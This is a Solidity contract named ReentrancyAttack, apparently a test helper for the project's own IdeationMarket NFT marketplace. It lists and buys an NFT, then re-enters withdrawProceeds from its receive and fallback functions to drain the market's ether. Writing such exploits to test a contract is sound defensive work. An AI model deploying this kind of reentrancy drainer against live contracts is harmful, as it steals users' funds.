// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

import "contracts/IdeationMarket.sol";
import "./BasicNft.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract ReentrancyAttack is IERC721Receiver {
    address payable s_ideationMarketAddress;
    address s_basicNftAddress;
    IdeationMarket ideationMarketInstance;
    BasicNft basicNftInstance;
    uint256 private s_fallbackCounter = 0;

    constructor(address ideationMarketAddress, address basicNftAddress) {
        s_ideationMarketAddress = payable(ideationMarketAddress);
        s_basicNftAddress = basicNftAddress;
        basicNftInstance = BasicNft(s_basicNftAddress);
    }

    function fund() public payable returns (uint256) {
        return address(this).balance;
    }

    function mintNft(uint tokenId) public {
        basicNftInstance.mintNft();
        basicNftInstance.approve(s_ideationMarketAddress, tokenId);
    }

    function attack() public payable {
        ideationMarketInstance = IdeationMarket(s_ideationMarketAddress);
        ideationMarketInstance.listItem(
            s_basicNftAddress,
            3,
            0.1 ether,
            0x0000000000000000000000000000000000000000,
            0
        );
        ideationMarketInstance.buyItem{value: 0.1 ether}(s_basicNftAddress, 3);
        ideationMarketInstance.withdrawProceeds();
    }

    fallback() external payable {
        // fallback gets used by older solidity versions
        if (s_fallbackCounter < 100 && address(s_ideationMarketAddress).balance >= 0.1 ether) {
            s_fallbackCounter++;
            ideationMarketInstance.withdrawProceeds();
        }
    }

    receive() external payable {
        if (address(s_ideationMarketAddress).balance >= 0.1 ether) {
            // I need the Counter because without this would be an infinite Loop ( at least for the gas estimation)
            s_fallbackCounter++;
            ideationMarketInstance.withdrawProceeds();
        }
    }

    function onERC721Received(
        address /*operator*/,
        address /*from*/,
        uint256 /*tokenId*/,
        bytes calldata /*data*/
    ) external pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdraw() public {
        payable(msg.sender).transfer(getBalance());
    }
}
